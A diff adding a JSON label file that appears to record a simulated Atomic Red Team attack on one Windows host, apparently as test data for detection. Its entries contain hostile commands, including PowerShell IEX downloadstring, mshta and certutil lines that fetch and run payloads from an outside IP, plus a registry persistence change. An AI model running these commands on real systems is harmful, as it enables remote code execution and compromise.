@@ -1,0 +1,152 @@
+[
+  {
+    "id": "A1",
+    "stage": "Execution",
+    "match_substring": "downloadstring('http://124.223.85.207:8082/a')",
+    "full_command": "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+    "file_path": null,
+    "occurTime_start": "2022-04-08 14:30:40.000",
+    "occurTime_end": "2022-04-08 14:31:10.000",
+    "hostIp": "192.168.0.74"
+  },
+  {
+    "id": "A2",
+    "stage": "Execution",
+    "match_substring": "T1059.005",
+    "full_command": "Invoke-AtomicTest T1059.005  -TestNumbers 1",
+    "file_path": null,
+    "occurTime_start": "2022-04-08 14:30:50.000",
+    "occurTime_end": "2022-04-08 14:30:52.000",
+    "hostIp": "192.168.0.74"
+  },
+  {
+    "id": "A3",
+    "stage": "Execution",
+    "match_substring": "T1059.007.vbs",
+    "full_command": "cscript.exe  /e:VBScript.Encode T1059.007.vbs",
+    "file_path": "C:\\Users\\Administrator\\Desktop\\shell\\T1059.007.vbs",
+    "occurTime_start": "2022-04-08 14:31:00.000",
+    "occurTime_end": "2022-04-08 14:31:00.000",
+    "hostIp": "192.168.0.74"
+  },
+  {
+    "id": "A4",
+    "stage": "Persistence",
+    "match_substring": "t1547.001",
+    "full_command": "Invoke-AtomicTest t1547.001 -TestNumbers 1",
+    "file_path": null,
+    "occurTime_start": "2022-04-08 14:31:11.000",
+    "occurTime_end": "2022-04-08 14:31:12.000",
+    "hostIp": "192.168.0.74"
+  },
+  {
+    "id": "A5",
+    "stage": "Persistence",
+    "match_substring": "verifierdlls",
+    "full_command": "reg add \"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \" /v \"verifierdlls \" /d \"1 \" /f",
+    "file_path": null,
+    "occurTime_start": "2022-04-08 14:31:21.000",
+    "occurTime_end": "2022-04-08 14:31:22.000",
+    "hostIp": "192.168.0.74"
+  },
+  {
+    "id": "A6",
+    "stage": "Defense Evasion",
+    "match_substring": "spolsv.exe",
+    "full_command": "spolsv.exe",
+    "file_path": "C:\\Users\\Administrator\\Desktop\\shell\\spolsv.exe",
+    "occurTime_start": "2022-04-08 14:31:32.000",
+    "occurTime_end": "2022-04-08 14:31:32.000",
+    "hostIp": "192.168.0.74"
+  },
+  {
+    "id": "A7",
+    "stage": "Defense Evasion",
+    "match_substring": "T1218.005.hta",
+    "full_command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+    "file_path": null,
+    "occurTime_start": "2022-04-08 14:31:42.000",
+    "occurTime_end": "2022-04-08 14:31:42.000",
+    "hostIp": "192.168.0.74"
+  },
+  {
+    "id": "A8",
+    "stage": "Discovery",
+    "match_substring": "systemdrive%\\Users\\*.*",
+    "full_command": "dir %systemdrive%\\Users\\*.*",
+    "file_path": null,
+    "occurTime_start": "2022-04-08 14:31:53.000",
+    "occurTime_end": "2022-04-08 14:31:53.000",
+    "hostIp": "192.168.0.74"
+  },
+  {
+    "id": "A9",
+    "stage": "Discovery",
+    "match_substring": "tasklist",
+    "full_command": "tasklist",
+    "file_path": null,
+    "occurTime_start": "2022-04-08 14:32:03.000",
+    "occurTime_end": "2022-04-08 14:32:03.000",
+    "hostIp": "192.168.0.74"
+  },
+  {
+    "id": "A10",
+    "stage": "Discovery",
+    "match_substring": "systeminfo",
+    "full_command": "systeminfo",
+    "file_path": null,
+    "occurTime_start": "2022-04-08 14:32:13.000",
+    "occurTime_end": "2022-04-08 14:32:15.000",
+    "hostIp": "192.168.0.74"
+  },
+  {
+    "id": "A11",
+    "stage": "Discovery",
+    "match_substring": "net time \\\\127.0.0.1",
+    "full_command": "net time \\\\127.0.0.1",
+    "file_path": null,
+    "occurTime_start": "2022-04-08 14:32:24.000",
+    "occurTime_end": "2022-04-08 14:32:24.000",
+    "hostIp": "192.168.0.74"
+  },
+  {
+    "id": "A12",
+    "stage": "Discovery",
+    "match_substring": null,
+    "full_command": "whoami",
+    "file_path": null,
+    "occurTime_start": "2022-04-08 14:32:34.000",
+    "occurTime_end": "2022-04-08 14:32:34.000",
+    "hostIp": "192.168.0.74"
+  },
+  {
+    "id": "A13",
+    "stage": "Discovery",
+    "match_substring": "route print -4",
+    "full_command": "ipconfig & arp -a & route print -4",
+    "file_path": null,
+    "occurTime_start": "2022-04-08 14:32:44.000",
+    "occurTime_end": "2022-04-08 14:32:45.000",
+    "hostIp": "192.168.0.74"
+  },
+  {
+    "id": "A14",
+    "stage": "Command and Control",
+    "match_substring": "Invoke-WebRequest http://124.223.85.207:8082/Test.hta",
+    "full_command": "Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+    "file_path": null,
+    "occurTime_start": "2022-04-08 14:32:54.000",
+    "occurTime_end": "2022-04-08 14:32:54.000",
+    "hostIp": "192.168.0.74"
+  },
+  {
+    "id": "A15",
+    "stage": "Command and Control",
+    "match_substring": "urlcache -split -f  http://124.223.85.207:8082/Test.hta",
+    "full_command": "certutil -urlcache -split -f  http://124.223.85.207:8082/Test.hta",
+    "file_path": null,
+    "occurTime_start": "2022-04-08 14:33:15.000",
+    "occurTime_end": "2022-04-08 14:33:16.000",
+    "hostIp": "192.168.0.74"
+  }
+]
